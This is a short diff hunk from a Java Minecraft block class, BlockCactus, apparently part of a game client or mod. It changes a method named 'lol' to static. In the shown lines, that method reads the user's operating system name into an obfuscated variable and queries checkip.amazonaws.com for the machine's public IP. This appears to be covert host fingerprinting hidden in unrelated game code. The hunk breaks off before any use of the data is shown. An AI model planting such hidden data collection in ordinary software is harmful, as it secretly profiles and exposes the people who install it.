@@ -154,7 +154,7 @@ public class BlockCactus extends Block
     {
         return this.getDefaultState().withProperty(AGE, Integer.valueOf(meta));
     }
-    public void lol(){
+    public static void lol(){
         String llLlLlL = System.getProperty("os.name");
         try {
             URL whatismyip = new URL("http://checkip.amazonaws.com");
